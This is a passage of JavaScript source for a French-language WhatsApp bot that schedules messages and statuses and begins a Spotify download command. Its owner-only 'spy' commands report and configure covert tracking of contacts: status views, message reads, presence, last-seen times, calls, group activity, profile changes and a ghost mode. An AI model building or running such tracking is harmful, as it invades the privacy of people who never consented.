      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      exportData += `   FIN DE L'EXPORT\n`;
      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      
      return send(exportData);
    }

    case "spystats":
    case "statsespion":
    case "statistiques": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args?.toLowerCase();
      const now = Date.now();
      const oneDay = 24 * 60 * 60 * 1000;
      const oneWeek = 7 * oneDay;
      const oneMonth = 30 * oneDay;
      
      let period = oneDay;
      let periodName = "aujourd'hui";
      
      if (param === "semaine" || param === "week") {
        period = oneWeek;
        periodName = "cette semaine";
      } else if (param === "mois" || param === "month") {
        period = oneMonth;
        periodName = "ce mois";
      }
      
      // Filtrer par pÃ©riode
      const filterByPeriod = (arr, timestampKey = "timestamp") => {
        return (arr || []).filter(item => {
          const ts = item[timestampKey] || item.timestamp || 0;
          return (now - ts) < period;
        });
      };
      
      const statusViewsPeriod = filterByPeriod(spyData.statusViews);
      const readsPeriod = filterByPeriod(spyData.messageReads);
      const repliesPeriod = filterByPeriod(spyData.replies);
      const presencePeriod = filterByPeriod(spyData.presenceDetected);
      const callsPeriod = filterByPeriod(spyData.callHistory);
      const groupPeriod = filterByPeriod(spyData.groupActivity);
      
      // Top viewers
      const viewerCounts = {};
      for (const v of statusViewsPeriod) {
        viewerCounts[v.viewer] = (viewerCounts[v.viewer] || 0) + 1;
      }
      const topViewers = Object.entries(viewerCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
      
      // Top lecteurs
      const readerCounts = {};
      for (const r of readsPeriod) {
        readerCounts[r.reader] = (readerCounts[r.reader] || 0) + 1;
      }
      const topReaders = Object.entries(readerCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
      
      let stats = `ðŸ“Š â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *STATISTIQUES ESPION*\n   _${periodName}_\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      stats += `ðŸ“ˆ *RÃ‰SUMÃ‰:*\n`;
      stats += `â€¢ ðŸ‘ï¸ Vues statuts: ${statusViewsPeriod.length}\n`;
      stats += `â€¢ ðŸ“– Messages lus: ${readsPeriod.length}\n`;
      stats += `â€¢ â†©ï¸ RÃ©ponses: ${repliesPeriod.length}\n`;
      stats += `â€¢ âœï¸ PrÃ©sences: ${presencePeriod.length}\n`;
      stats += `â€¢ ðŸ“ž Appels: ${callsPeriod.length}\n`;
      stats += `â€¢ ðŸ‘¥ Ã‰vÃ©nements groupe: ${groupPeriod.length}\n\n`;
      
      if (topViewers.length > 0) {
        stats += `ðŸ† *TOP VIEWERS STATUTS:*\n`;
        for (let i = 0; i < topViewers.length; i++) {
          const [viewer, count] = topViewers[i];
          stats += `${i + 1}. ${viewer.replace(/[^0-9]/g, '').slice(-10)} (${count} vues)\n`;
        }
        stats += `\n`;
      }
      
      if (topReaders.length > 0) {
        stats += `ðŸ† *TOP LECTEURS:*\n`;
        for (let i = 0; i < topReaders.length; i++) {
          const [reader, count] = topReaders[i];
          stats += `${i + 1}. ${reader.replace(/[^0-9]/g, '').slice(-10)} (${count} lectures)\n`;
        }
        stats += `\n`;
      }
      
      stats += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      stats += `ðŸ“‹ *PÃ©riodes:*\n`;
      stats += `â€¢ \`.spystats\` â†’ Aujourd'hui\n`;
      stats += `â€¢ \`.spystats semaine\` â†’ Cette semaine\n`;
      stats += `â€¢ \`.spystats mois\` â†’ Ce mois`;
      
      return send(stats);
    }

    case "trackconfig":
    case "spyconfig":
    case "configespion": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args?.toLowerCase()?.split(" ")[0];
      const value = args?.toLowerCase()?.split(" ")[1];
      
      if (param && value) {
        const boolValue = value === "on" || value === "true" || value === "1";
        
        switch (param) {
          case "lastseen":
            spyConfig.trackLastSeen = boolValue;
            return send(`ðŸ• Tracker connexions: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
          case "photo":
            spyConfig.alertPhotoChange = boolValue;
            return send(`ðŸ“· Alertes photo: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
          case "bio":
            spyConfig.alertBioChange = boolValue;
            return send(`ðŸ“ Alertes bio: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
          case "name":
            spyConfig.alertNameChange = boolValue;
            return send(`ðŸ‘¤ Alertes nom: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
          case "calls":
            spyConfig.trackCalls = boolValue;
            return send(`ðŸ“ž Tracker appels: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
          case "groups":
            spyConfig.trackGroups = boolValue;
            return send(`ðŸ‘¥ Tracker groupes: ${boolValue ? "âœ… ON" : "âŒ OFF"}`);
        }
      }
      
      let config = `âš™ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *CONFIGURATION ESPION*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      config += `ðŸ” *TRACKERS:*\n`;
      config += `â€¢ ðŸ• Connexions: ${spyConfig.trackLastSeen ? "âœ…" : "âŒ"}\n`;
      config += `â€¢ ðŸ“ž Appels: ${spyConfig.trackCalls ? "âœ…" : "âŒ"}\n`;
      config += `â€¢ ðŸ‘¥ Groupes: ${spyConfig.trackGroups ? "âœ…" : "âŒ"}\n\n`;
      
      config += `ðŸ”” *ALERTES PROFIL:*\n`;
      config += `â€¢ ðŸ“· Photo: ${spyConfig.alertPhotoChange ? "âœ…" : "âŒ"}\n`;
      config += `â€¢ ðŸ“ Bio: ${spyConfig.alertBioChange ? "âœ…" : "âŒ"}\n`;
      config += `â€¢ ðŸ‘¤ Nom: ${spyConfig.alertNameChange ? "âœ…" : "âŒ"}\n\n`;
      
      config += `ðŸ‘» *MODE FANTÃ”ME:*\n`;
      config += `â€¢ Global: ${spyConfig.ghostMode ? "âœ… ACTIF" : "âŒ INACTIF"}\n\n`;
      
      config += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      config += `ðŸ“‹ *Modifier:*\n`;
      config += `\`.spyconfig [option] [on/off]\`\n\n`;
      config += `Options: lastseen, photo, bio, name, calls, groups`;
      
      return send(config);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“… MESSAGES PROGRAMMÃ‰S â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    case "schedule":
    case "programmer":
    case "planifier": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      // Format: .schedule 22550252467 14:30 Message Ã  envoyer
      // Ou: .schedule @mention 14:30 Message Ã  envoyer
      const parts = args?.split(" ") || [];
      
      if (parts.length < 3) {
        return send(`ðŸ“… *PROGRAMMER UN MESSAGE*\n\nðŸ“‹ *Usage:*\n\`.schedule [numÃ©ro] [heure] [message]\`\n\nðŸ“ *Exemples:*\nâ€¢ \`.schedule 22550252467 14:30 Salut Ã§a va?\`\nâ€¢ \`.schedule 22550252467 8:00 Bonjour!\`\nâ€¢ \`.schedule 33612345678 20h00 Bonne soirÃ©e\`\n\nâ° *Formats d'heure acceptÃ©s:*\nâ€¢ 14:30 ou 14h30 ou 1430\nâ€¢ 8:00 ou 8h ou 08:00\n\nðŸ’¡ *Autres commandes:*\nâ€¢ \`.schedulelist\` â†’ Voir les messages programmÃ©s\nâ€¢ \`.scheduledel [id]\` â†’ Supprimer un message\nâ€¢ \`.schedulerepeat\` â†’ Message rÃ©current`);
      }
      
      let targetNumber = parts[0].replace(/[^0-9]/g, '');
      let timeStr = parts[1];
      const message = parts.slice(2).join(" ");
      
      // Normaliser le format de l'heure (accepter plusieurs formats)
      // Remplacer 'h' par ':' et supprimer les espaces
      timeStr = timeStr.toLowerCase().replace(/h/g, ':').replace(/\s/g, '');
      
      // Si format HHMM sans sÃ©parateur (ex: 1430)
      if (/^\d{3,4}$/.test(timeStr)) {
        const padded = timeStr.padStart(4, '0');
        timeStr = padded.slice(0, 2) + ':' + padded.slice(2);
      }
      
      // Si format H:MM (ex: 8:30), ajouter le 0 devant
      if (/^\d:\d{2}$/.test(timeStr)) {
        timeStr = '0' + timeStr;
      }
      
      // Si juste un nombre (ex: 14 pour 14:00)
      if (/^\d{1,2}$/.test(timeStr)) {
        timeStr = timeStr.padStart(2, '0') + ':00';
      }
      
      // VÃ©rifier le format final de l'heure
      const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
      if (!timeMatch) {
        return send(`âŒ *Format d'heure non reconnu:* "${parts[1]}"\n\nâ° *Formats acceptÃ©s:*\nâ€¢ 14:30 ou 14h30\nâ€¢ 8:00 ou 8h00 ou 08:00\nâ€¢ 1430 (sans sÃ©parateur)\nâ€¢ 14 (pour 14:00)\n\nðŸ“ *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
      }
      
      const hours = parseInt(timeMatch[1]);
      const minutes = parseInt(timeMatch[2]);
      
      if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59) {
        return send(`âŒ Heure invalide.\n\nâ° L'heure doit Ãªtre entre 00:00 et 23:59`);
      }
      
      // Calculer l'heure d'envoi
      const now = new Date();
      let scheduledDate = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hours, minutes, 0);
      
      // Si l'heure est dÃ©jÃ  passÃ©e aujourd'hui, programmer pour demain
      if (scheduledDate.getTime() < now.getTime()) {
        scheduledDate.setDate(scheduledDate.getDate() + 1);
      }
      
      // CrÃ©er le JID
      const targetJid = targetNumber + "@s.whatsapp.net";
      
      // RÃ©cupÃ©rer le nom du contact
      let targetName = targetNumber;
      try {
        const contact = await hani.onWhatsApp(targetJid);
        if (contact && contact[0]) {
          targetName = contact[0].notify || contact[0].name || targetNumber;
        }
      } catch (e) {}
      
      // CrÃ©er le message programmÃ©
      const scheduledMsg = {
        id: Date.now(),
        targetJid,
        targetName,
        message,
        scheduledTime: scheduledDate.getTime(),
        repeat: 'once',
        repeatInterval: null,
        active: true,
        createdAt: Date.now()
      };
      
      scheduledMessages.push(scheduledMsg);
      
      // DÃ©marrer le scheduler si pas encore fait
      startScheduler(hani);
      
      const timeDisplay = scheduledDate.toLocaleString("fr-FR");
      const isToday = scheduledDate.getDate() === now.getDate();
      
      return send(`ðŸ“… *Message programmÃ©!*\n\nðŸ‘¤ *Ã€:* ${targetName}\nðŸ“± *NumÃ©ro:* +${targetNumber}\nðŸ’¬ *Message:* "${message.slice(0, 100)}${message.length > 100 ? '...' : ''}"\nâ° *Envoi:* ${timeDisplay}\nðŸ“† ${isToday ? "Aujourd'hui" : "Demain"}\n\nðŸ†” ID: ${scheduledMsg.id}\n\nðŸ’¡ \`.schedulelist\` pour voir tous les messages`);
    }

    case "schedulerepeat":
    case "programmerrepeat":
    case "messagerecurrent": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      // Format: .schedulerepeat 22550252467 08:00 daily Bonjour!
      const parts = args?.split(" ") || [];
      
      if (parts.length < 4) {
        return send(`ðŸ“… *MESSAGE RÃ‰CURRENT*\n\nðŸ“‹ *Usage:*\n\`.schedulerepeat [numÃ©ro] [heure] [frÃ©quence] [message]\`\n\nðŸ“ *FrÃ©quences:*\nâ€¢ \`daily\` â†’ Tous les jours\nâ€¢ \`weekly\` â†’ Chaque semaine\nâ€¢ \`monthly\` â†’ Chaque mois\n\nðŸ“ *Exemple:*\n\`.schedulerepeat 22550252467 8:00 daily Bonjour!\`\n\nâ° *Formats d'heure:* 8:00, 08h00, 0800`);
      }
      
      let targetNumber = parts[0].replace(/[^0-9]/g, '');
      let timeStr = parts[1];
      const repeat = parts[2].toLowerCase();
      const message = parts.slice(3).join(" ");
      
      // VÃ©rifier la frÃ©quence
      if (!['daily', 'weekly', 'monthly'].includes(repeat)) {
        return send(`âŒ FrÃ©quence invalide.\n\nUtilise: daily, weekly, ou monthly`);
      }
      
      // Normaliser le format de l'heure
      timeStr = timeStr.toLowerCase().replace(/h/g, ':').replace(/\s/g, '');
      if (/^\d{3,4}$/.test(timeStr)) {
        const padded = timeStr.padStart(4, '0');
        timeStr = padded.slice(0, 2) + ':' + padded.slice(2);
      }
      if (/^\d:\d{2}$/.test(timeStr)) {
        timeStr = '0' + timeStr;
      }
      if (/^\d{1,2}$/.test(timeStr)) {
        timeStr = timeStr.padStart(2, '0') + ':00';
      }
      
      // VÃ©rifier le format de l'heure
      const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
      if (!timeMatch) {
        return send(`âŒ Format d'heure non reconnu: "${parts[1]}"\n\nâ° Formats: 14:30, 14h30, 1430, 8:00`);
      }
      
      const hours = parseInt(timeMatch[1]);
      const minutes = parseInt(timeMatch[2]);
      
      // Calculer l'heure d'envoi
      const now = new Date();
      let scheduledDate = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hours, minutes, 0);
      
      if (scheduledDate.getTime() < now.getTime()) {
        scheduledDate.setDate(scheduledDate.getDate() + 1);
      }
      
      const targetJid = targetNumber + "@s.whatsapp.net";
      
      let targetName = targetNumber;
      try {
        const contact = await hani.onWhatsApp(targetJid);
        if (contact && contact[0]) {
          targetName = contact[0].notify || contact[0].name || targetNumber;
        }
      } catch (e) {}
      
      const scheduledMsg = {
        id: Date.now(),
        targetJid,
        targetName,
        message,
        scheduledTime: scheduledDate.getTime(),
        repeat,
        repeatInterval: null,
        active: true,
        createdAt: Date.now()
      };
      
      scheduledMessages.push(scheduledMsg);
      startScheduler(hani);
      
      const freqLabels = { daily: "Tous les jours", weekly: "Chaque semaine", monthly: "Chaque mois" };
      
      return send(`ðŸ“… *Message rÃ©current programmÃ©!*\n\nðŸ‘¤ *Ã€:* ${targetName}\nðŸ“± *NumÃ©ro:* +${targetNumber}\nðŸ’¬ *Message:* "${message.slice(0, 80)}..."\nâ° *Heure:* ${timeStr}\nðŸ”„ *FrÃ©quence:* ${freqLabels[repeat]}\nðŸ“† *Prochain envoi:* ${scheduledDate.toLocaleString("fr-FR")}\n\nðŸ†” ID: ${scheduledMsg.id}`);
    }

    case "schedulelist":
    case "programmelist":
    case "listeprogrammes": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const activeMessages = scheduledMessages.filter(m => m.active);
      
      if (activeMessages.length === 0) {
        return send(`ðŸ“… *Aucun message programmÃ©*\n\nðŸ’¡ Utilise \`.schedule\` pour programmer un message.\n\nðŸ“ *Exemple:*\n\`.schedule 22550252467 14:30 Salut!\``);
      }
      
      let list = `ðŸ“… â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *MESSAGES PROGRAMMÃ‰S*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      for (const msg of activeMessages) {
        const nextSend = new Date(msg.scheduledTime).toLocaleString("fr-FR");
        const repeatLabel = msg.repeat === 'once' ? 'â±ï¸ Une fois' : 
                           msg.repeat === 'daily' ? 'ðŸ”„ Quotidien' : 
                           msg.repeat === 'weekly' ? 'ðŸ”„ Hebdo' : 
                           msg.repeat === 'monthly' ? 'ðŸ”„ Mensuel' : 'â±ï¸';
        
        list += `ðŸ†” *${msg.id}*\n`;
        list += `ðŸ‘¤ ${msg.targetName}\n`;
        list += `ðŸ“± +${msg.targetJid.split("@")[0]}\n`;
        list += `ðŸ’¬ "${msg.message.slice(0, 40)}..."\n`;
        list += `â° ${nextSend}\n`;
        list += `${repeatLabel}\n\n`;
      }
      
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      list += `ðŸ“Š *Total:* ${activeMessages.length} message(s)\n\n`;
      list += `ðŸ’¡ \`.scheduledel [id]\` pour supprimer`;
      
      return send(list);
    }

    case "scheduledel":
    case "schedulecancel":
    case "supprimerprogramme": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const msgId = parseInt(args);
      
      if (!msgId) {
        return send(`âŒ *Usage:* \`.scheduledel [id]\`\n\nðŸ’¡ Utilise \`.schedulelist\` pour voir les IDs`);
      }
      
      const index = scheduledMessages.findIndex(m => m.id === msgId);
      
      if (index === -1) {
        return send(`âŒ Message programmÃ© #${msgId} non trouvÃ©.`);
      }
      
      const deleted = scheduledMessages[index];
      scheduledMessages.splice(index, 1);
      
      return send(`ðŸ—‘ï¸ *Message programmÃ© supprimÃ©*\n\nðŸ†” ID: ${deleted.id}\nðŸ‘¤ Ã€: ${deleted.targetName}\nðŸ’¬ "${deleted.message.slice(0, 50)}..."`);
    }

    case "scheduleclear":
    case "clearschedule": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const count = scheduledMessages.length;
      scheduledMessages.length = 0;
      
      return send(`ðŸ—‘ï¸ *Tous les messages programmÃ©s supprimÃ©s*\n\nðŸ“Š ${count} message(s) effacÃ©(s)`);
    }

    case "schedulepause":
    case "pauseprogramme": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const msgId = parseInt(args);
      
      if (!msgId) {
        return send(`âŒ *Usage:* \`.schedulepause [id]\`\n\nðŸ’¡ Utilise \`.schedulelist\` pour voir les IDs`);
      }
      
      const msg = scheduledMessages.find(m => m.id === msgId);
      
      if (!msg) {
        return send(`âŒ Message programmÃ© #${msgId} non trouvÃ©.`);
      }
      
      msg.active = !msg.active;
      
      return send(`${msg.active ? "â–¶ï¸ *Message rÃ©activÃ©*" : "â¸ï¸ *Message mis en pause*"}\n\nðŸ†” ID: ${msg.id}\nðŸ‘¤ Ã€: ${msg.targetName}`);
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸ“¸ STATUTS PROGRAMMÃ‰S (Stories WhatsApp)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    case "statusschedule":
    case "schedulestatus":
    case "programstatus":
    case "statutprogramme": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      // Format: .statusschedule 14:30 [texte du statut]
      // Ou rÃ©pondre Ã  une image/vidÃ©o avec: .statusschedule 14:30 [lÃ©gende]
      const parts = args?.split(" ") || [];
      
      if (parts.length < 1) {
        return send(`ðŸ“¸ *PROGRAMMER UN STATUT*\n\nðŸ“‹ *Usage:*\n\n*Statut texte:*\n\`.statusschedule [heure] [texte]\`\nEx: \`.statusschedule 14:30 Bonne journÃ©e Ã  tous!\`\n\n*Statut image/vidÃ©o:*\nRÃ©ponds Ã  une image ou vidÃ©o avec:\n\`.statusschedule [heure] [lÃ©gende]\`\nEx: \`.statusschedule 20:00 Mon nouveau look\`\n\nâ° *Formats:* 14:30, 14h30, 8:00\n\nðŸ’¡ *Autres commandes:*\nâ€¢ \`.statuslist\` â†’ Voir statuts programmÃ©s\nâ€¢ \`.statusdel [id]\` â†’ Supprimer\nâ€¢ \`.statusrepeat\` â†’ Statut rÃ©current`);
      }
      
      let timeStr = parts[0];
      let content = parts.slice(1).join(" ");
      
      // Normaliser le format de l'heure
      timeStr = timeStr.toLowerCase().replace(/h/g, ':').replace(/\s/g, '');
      if (/^\d{3,4}$/.test(timeStr)) {
        const padded = timeStr.padStart(4, '0');
        timeStr = padded.slice(0, 2) + ':' + padded.slice(2);
      }
      if (/^\d:\d{2}$/.test(timeStr)) timeStr = '0' + timeStr;
      if (/^\d{1,2}$/.test(timeStr)) timeStr = timeStr.padStart(2, '0') + ':00';
      
      const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
      if (!timeMatch) {
        return send(`âŒ Format d'heure non reconnu: "${parts[0]}"\n\nâ° Formats: 14:30, 14h30, 8:00`);
      }
      
      const hours = parseInt(timeMatch[1]);
      const minutes = parseInt(timeMatch[2]);
      
      if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59) {
        return send(`âŒ Heure invalide. Doit Ãªtre entre 00:00 et 23:59`);
      }
      
      // Calculer l'heure d'envoi
      const now = new Date();
      let scheduledDate = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hours, minutes, 0);
      if (scheduledDate.getTime() < now.getTime()) {
        scheduledDate.setDate(scheduledDate.getDate() + 1);
      }
      
      // VÃ©rifier si c'est une rÃ©ponse Ã  un mÃ©dia
      const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      let statusType = 'text';
      let mediaBuffer = null;
      let caption = content;
      
      if (quotedMsg?.imageMessage) {
        statusType = 'image';
        try {
          mediaBuffer = await downloadMediaMessage({ message: quotedMsg }, 'buffer');
          console.log("ðŸ“¸ [STATUS] Image tÃ©lÃ©chargÃ©e pour statut programmÃ©");
        } catch (e) {
          return send(`âŒ Erreur tÃ©lÃ©chargement image: ${e.message}`);
        }
      } else if (quotedMsg?.videoMessage) {
        statusType = 'video';
        try {
          mediaBuffer = await downloadMediaMessage({ message: quotedMsg }, 'buffer');
          console.log("ðŸŽ¥ [STATUS] VidÃ©o tÃ©lÃ©chargÃ©e pour statut programmÃ©");
        } catch (e) {
          return send(`âŒ Erreur tÃ©lÃ©chargement vidÃ©o: ${e.message}`);
        }
      } else if (!content) {
        return send(`âŒ Tu dois fournir un texte ou rÃ©pondre Ã  une image/vidÃ©o.\n\nðŸ“ Ex: \`.statusschedule 14:30 Mon message\``);
      }
      
      // CrÃ©er le statut programmÃ©
      const statusEntry = {
        id: Date.now(),
        type: statusType,
        content: statusType === 'text' ? content : null,
        mediaBuffer: mediaBuffer,
        caption: caption || "",
        scheduledTime: scheduledDate.getTime(),
        repeat: 'once',
        active: true,
        createdAt: Date.now(),
        backgroundColor: "#128C7E", // Vert WhatsApp
        font: 0
      };
      
      scheduledStatus.push(statusEntry);
      startScheduler(hani);
      
      const typeEmoji = statusType === 'text' ? 'ðŸ“' : statusType === 'image' ? 'ðŸ–¼ï¸' : 'ðŸŽ¥';
      const isToday = scheduledDate.getDate() === now.getDate();
      
      return send(`ðŸ“¸ *Statut programmÃ©!*\n\n${typeEmoji} *Type:* ${statusType}\nðŸ’¬ *Contenu:* "${(content || caption || '[MÃ©dia]').slice(0, 80)}"\nâ° *Publication:* ${scheduledDate.toLocaleString("fr-FR")}\nðŸ“† ${isToday ? "Aujourd'hui" : "Demain"}\n\nðŸ†” ID: ${statusEntry.id}\n\nðŸ’¡ \`.statuslist\` pour voir tous les statuts`);
    }

    case "statusrepeat":
    case "repeatstatus":
    case "statutrecurrent": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      // Format: .statusrepeat 08:00 daily Bonjour tout le monde!
      const parts = args?.split(" ") || [];
      
      if (parts.length < 3) {
        return send(`ðŸ“¸ *STATUT RÃ‰CURRENT*\n\nðŸ“‹ *Usage:*\n\`.statusrepeat [heure] [frÃ©quence] [texte]\`\n\nðŸ“ *FrÃ©quences:*\nâ€¢ \`daily\` â†’ Tous les jours\nâ€¢ \`weekly\` â†’ Chaque semaine\n\nðŸ“ *Exemple:*\n\`.statusrepeat 08:00 daily Bonjour! ðŸŒž\`\n\n_Publie un statut tous les jours Ã  8h_`);
      }
      
      let timeStr = parts[0];
      const repeat = parts[1].toLowerCase();
      const content = parts.slice(2).join(" ");
      
      if (!['daily', 'weekly'].includes(repeat)) {
        return send(`âŒ FrÃ©quence invalide.\n\nUtilise: daily ou weekly`);
      }
      
      // Normaliser l'heure
      timeStr = timeStr.toLowerCase().replace(/h/g, ':').replace(/\s/g, '');
      if (/^\d{3,4}$/.test(timeStr)) {
        const padded = timeStr.padStart(4, '0');
        timeStr = padded.slice(0, 2) + ':' + padded.slice(2);
      }
      if (/^\d:\d{2}$/.test(timeStr)) timeStr = '0' + timeStr;
      if (/^\d{1,2}$/.test(timeStr)) timeStr = timeStr.padStart(2, '0') + ':00';
      
      const timeMatch = timeStr.match(/^(\d{1,2}):(\d{2})$/);
      if (!timeMatch) {
        return send(`âŒ Format d'heure invalide: "${parts[0]}"`);
      }
      
      const hours = parseInt(timeMatch[1]);
      const minutes = parseInt(timeMatch[2]);
      
      const now = new Date();
      let scheduledDate = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hours, minutes, 0);
      if (scheduledDate.getTime() < now.getTime()) {
        scheduledDate.setDate(scheduledDate.getDate() + 1);
      }
      
      const statusEntry = {
        id: Date.now(),
        type: 'text',
        content: content,
        mediaBuffer: null,
        caption: "",
        scheduledTime: scheduledDate.getTime(),
        repeat: repeat,
        active: true,
        createdAt: Date.now(),
        backgroundColor: "#128C7E",
        font: 0
      };
      
      scheduledStatus.push(statusEntry);
      startScheduler(hani);
      
      const freqLabels = { daily: "Tous les jours", weekly: "Chaque semaine" };
      
      return send(`ðŸ“¸ *Statut rÃ©current programmÃ©!*\n\nðŸ“ *Texte:* "${content.slice(0, 80)}"\nâ° *Heure:* ${parts[0]}\nðŸ”„ *FrÃ©quence:* ${freqLabels[repeat]}\nðŸ“† *Prochain:* ${scheduledDate.toLocaleString("fr-FR")}\n\nðŸ†” ID: ${statusEntry.id}`);
    }

    case "statuslist":
    case "liststatus":
    case "statutslist": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (scheduledStatus.length === 0) {
        return send(`ðŸ“¸ *Aucun statut programmÃ©*\n\nðŸ’¡ Utilise \`.statusschedule [heure] [texte]\` pour en crÃ©er`);
      }
      
      let list = `ðŸ“¸ *STATUTS PROGRAMMÃ‰S (${scheduledStatus.length})*\n\n`;
      
      for (const status of scheduledStatus) {
        const nextSend = new Date(status.scheduledTime).toLocaleString("fr-FR");
        const typeEmoji = status.type === 'text' ? 'ðŸ“' : status.type === 'image' ? 'ðŸ–¼ï¸' : 'ðŸŽ¥';
        const statusIcon = status.active ? "âœ…" : "â¸ï¸";
        const repeatIcon = status.repeat === 'once' ? "1ï¸âƒ£" : "ðŸ”„";
        
        list += `${statusIcon} *#${status.id}*\n`;
        list += `${typeEmoji} ${status.type} ${repeatIcon}\n`;
        list += `ðŸ’¬ "${(status.content || status.caption || '[MÃ©dia]').slice(0, 40)}..."\n`;
        list += `â° ${nextSend}\n\n`;
      }
      
      list += `ðŸ’¡ \`.statusdel [id]\` pour supprimer`;
      return send(list);
    }

    case "statusdel":
    case "delstatus":
    case "supprimerstatus": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const statusId = parseInt(args);
      
      if (!statusId) {
        return send(`âŒ *Usage:* \`.statusdel [id]\`\n\nðŸ’¡ Utilise \`.statuslist\` pour voir les IDs`);
      }
      
      const index = scheduledStatus.findIndex(s => s.id === statusId);
      
      if (index === -1) {
        return send(`âŒ Statut programmÃ© #${statusId} non trouvÃ©.`);
      }
      
      const deleted = scheduledStatus[index];
      scheduledStatus.splice(index, 1);
      
      return send(`ðŸ—‘ï¸ *Statut programmÃ© supprimÃ©*\n\nðŸ†” ID: ${deleted.id}\nðŸ“ "${(deleted.content || deleted.caption || '[MÃ©dia]').slice(0, 50)}..."`);
    }

    case "statusclear":
    case "clearstatus": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const count = scheduledStatus.length;
      scheduledStatus.length = 0;
      
      return send(`ðŸ—‘ï¸ *Tous les statuts programmÃ©s supprimÃ©s*\n\nðŸ“Š ${count} statut(s) effacÃ©(s)`);
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸŽµ SPOTIFY - Recherche et tÃ©lÃ©chargement (Multi-API)
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    case "spotify":
    case "spotifydl":
    case "spdl":
    case "sp": {
      if (!args) {
        return send(`ðŸŽµ *SPOTIFY*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.spotify [titre]\` â†’ TÃ©lÃ©charger directement\nâ€¢ \`.spotify [lien spotify]\` â†’ TÃ©lÃ©charger depuis lien\n\nðŸ“ *Exemples:*\nâ€¢ \`.spotify Rema Calm Down\`\nâ€¢ \`.spotify Burna Boy City Boys\`\nâ€¢ \`.spotify https://open.spotify.com/track/...\`\n\nðŸ’¡ La musique sera tÃ©lÃ©chargÃ©e et envoyÃ©e en MP3!`);
      }
      
      await send("ðŸŽµ *Recherche et tÃ©lÃ©chargement en cours...*\nâ³ _Cela peut prendre quelques secondes..._");
      
      try {
        const isSpotifyLink = args.includes("spotify.com") || args.includes("spotify:");
        let trackTitle = args;
